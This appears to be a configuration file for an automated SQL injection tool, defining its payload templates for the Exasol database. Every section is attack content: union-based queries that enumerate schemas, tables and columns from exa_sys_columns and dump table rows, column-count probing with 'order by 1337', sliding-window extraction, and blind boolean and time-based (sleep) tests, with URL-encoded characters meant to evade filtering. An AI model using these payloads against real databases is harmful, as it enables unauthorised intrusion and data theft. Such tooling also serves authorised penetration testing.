vendor: Exasol

resource:
 info: |
   'version()'
   || '${enclose_value_sql}'
   || 'database()'
   || '${enclose_value_sql}'
   || user()
   || '${trail_sql}'

 schema:
  database: |
   select concat(
       ifnull(
           group_concat(
               '${enclose_value_sql}'
               || r
               || '${separator_qte_sql}'
               || q
               || '${enclose_value_sql}'
               separator '${separator_cell_sql}'
           ),
           '${trail_sql}'
       ),
       '${trail_sql}'
   ) from (
       select distinct
           column_schema r,
           '0' q
       from exa_sys_columns
       order by r
       ${limit}
   ) x

  table: |
   select concat(
       ifnull(
           group_concat(
               '${enclose_value_sql}'
               || r
               || '${separator_qte_sql}'
               || q
               || '${enclose_value_sql}'
               separator '${separator_cell_sql}'
           ),
           '${trail_sql}'
       ),
       '${trail_sql}'
   ) from (
       select distinct
           column_table r,
           '0' q
       from exa_sys_columns
       where column_schema = '${database}'
       order by r
       ${limit}
   ) x

  column: |
   select concat(
       ifnull(
           group_concat(
               '${enclose_value_sql}'
               || r
               || '${separator_qte_sql}'
               || q
               || '${enclose_value_sql}'
               separator '${separator_cell_sql}'
           ),
           '${trail_sql}'
       ),
       '${trail_sql}'
   ) from (
       select distinct
           column_name r,
           '0' q
       from exa_sys_columns
       where column_schema = '${database}'
       and column_table = '${table}'
       order by r
       ${limit}
   ) x

  row:
   query: |
    select concat(
        group_concat(
                   '${enclose_value_sql}'
                   || r
                   || '${separator_qte_sql}'
                   || q
                   || '${enclose_value_sql}'
                   separator '${separator_cell_sql}'
        ),
        '${trail_sql}'
    ) from (
        select distinct
            concat(${fields}) r,
            '0' q
        from ${database}.${table}
        order by r
        ${limit}
    ) x
   fields:
    field: ${field.value}
    concat: ",'%7f',"

strategy:
 configuration:
  slidingWindow: |
   (
       select
           concat(
               '${lead}',
               mid(
                   (${injection}),
                   ${window.char},
                   ${capacity}
               )
           )
   )
  limit: limit ${limit.value}, 65536
  failsafe: 1337${indice}7330%2b1
  calibrator: repeat('${calibrator_sql}', 65536)
  limitBoundary: 0
  # Encoded space mandatory to avoid space cleaning
  # TODO keep raw space
  # endingComment: --+-
  # pentesterlab does not work with --+-, switch to #
  endingComment: --+-
  fingerprint:
   errorMessage:
    - Exasol
   orderByErrorMessage:
    - Wrong column number. Too large value 1337 as select list column reference in ORDER BY

 normal:
  indices: union select ${indices}
  capacity: |
   (
       select concat(
           '${lead}',
           ${indice},
           ${calibrator}
       )
   )
  orderBy: order by 1337

 binary:
  test:
   bit: |
    ascii(
        substring(
            ${injection},
            ${window.char},
            1
        )
    )
    %26${bit}
  modeAnd: and
  modeOr: or
  blind: ${binary.mode} ${test}
  time: |
   ${binary.mode} if(
       ${test},
       1,
       sleep(${sleep_time})
   )